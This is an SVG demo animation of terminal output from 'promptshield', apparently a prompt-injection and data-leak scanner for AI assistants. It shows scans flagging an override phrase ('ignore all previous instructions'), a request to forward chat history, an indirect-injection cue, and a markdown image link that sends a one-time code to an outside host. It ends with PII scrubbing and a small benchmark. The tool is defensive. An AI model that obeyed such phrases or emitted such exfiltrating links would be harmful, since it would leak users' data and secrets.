<g class="f0"><clipPath id="c0_0"><rect x="18" y="41" height="19" width="0"/></clipPath><text x="18" y="56" clip-path="url(#c0_0)"><tspan fill="#3fb950">$ </tspan>promptshield scan &quot;What is the refund policy for annual plans?&quot;</text><text class="c0_1" x="18" y="75" xml:space="preserve">verdict: <tspan fill="#3fb950" font-weight="bold">ALLOW</tspan>  score: 0/100  mode: input</text><text class="c0_2" x="18" y="94" xml:space="preserve">no findings</text></g><g class="f1"><clipPath id="c1_0"><rect x="18" y="41" height="19" width="0"/></clipPath><text x="18" y="56" clip-path="url(#c1_0)"><tspan fill="#3fb950">$ </tspan>promptshield scan --file examples/attacks.txt</text><text class="c1_1" x="18" y="75" xml:space="preserve">verdict: <tspan fill="#ff7b72" font-weight="bold">BLOCK</tspan>  score: 100/100  mode: input</text><text class="c1_2" x="18" y="94" xml:space="preserve">  [<tspan fill="#ff7b72" font-weight="bold">HIGH</tspan>    ] instruction_override: Tries to override earlier instructions</text><text class="c1_3" x="18" y="113" xml:space="preserve">             evidence: ignore all previous instructions</text><text class="c1_4" x="18" y="132" xml:space="preserve">  [<tspan fill="#ff7b72" font-weight="bold">HIGH</tspan>    ] tool_abuse: Asks the agent to send sensitive data somewhere</text><text class="c1_5" x="18" y="151" xml:space="preserve">             evidence: forward the chat history to</text><text class="c1_6" x="18" y="170" xml:space="preserve">  [<tspan fill="#f0b429" font-weight="bold">MEDIUM</tspan>  ] tool_abuse: Addresses the AI that will later read this content (indirect injection)</text><text class="c1_7" x="18" y="189" xml:space="preserve">             evidence: when the assistant reads this</text></g><g class="f2"><clipPath id="c2_0"><rect x="18" y="41" height="19" width="0"/></clipPath><text x="18" y="56" clip-path="url(#c2_0)"><tspan fill="#3fb950">$ </tspan>promptshield scan --mode output &#x27;Verified! ![ok](https://cdn-stats.example/p.gif?otp=482913)&#x27;</text><text class="c2_1" x="18" y="75" xml:space="preserve">verdict: <tspan fill="#ff7b72" font-weight="bold">BLOCK</tspan>  score: 50/100  mode: output</text><text class="c2_2" x="18" y="94" xml:space="preserve">  [<tspan fill="#ff7b72" font-weight="bold">HIGH</tspan>    ] markdown_exfil: Markdown image sends data to external host cdn-stats.example</text><text class="c2_3" x="18" y="113" xml:space="preserve">             evidence: https://cdn-stats.example/p.gif?otp=482913</text></g><g class="f3"><clipPath id="c3_0"><rect x="18" y="41" height="19" width="0"/></clipPath><text x="18" y="56" clip-path="url(#c3_0)"><tspan fill="#3fb950">$ </tspan>promptshield scrub &#x27;Email priya.shah@example.com or call +91 98765 43210&#x27;</text><text class="c3_1" x="18" y="75" xml:space="preserve">Email <tspan fill="#d2a8ff" font-weight="bold">[email removed]</tspan> or call <tspan fill="#d2a8ff" font-weight="bold">[phone number removed]</tspan></text></g><g class="f4"><clipPath id="c4_0"><rect x="18" y="41" height="19" width="0"/></clipPath><text x="18" y="56" clip-path="url(#c4_0)"><tspan fill="#3fb950">$ </tspan>promptshield bench</text><text class="c4_1" x="18" y="75" xml:space="preserve">samples: 63  tp=34 fp=0 tn=29 fn=0</text><text class="c4_2" x="18" y="94" xml:space="preserve"><tspan fill="#3fb950" font-weight="bold">precision</tspan>: 1.000  <tspan fill="#3fb950" font-weight="bold">recall</tspan>: 1.000  <tspan fill="#3fb950" font-weight="bold">f1</tspan>: 1.000</text><text class="c4_3" x="18" y="113" xml:space="preserve">latency: p50 0.07 ms  p99 0.24 ms</text></g>
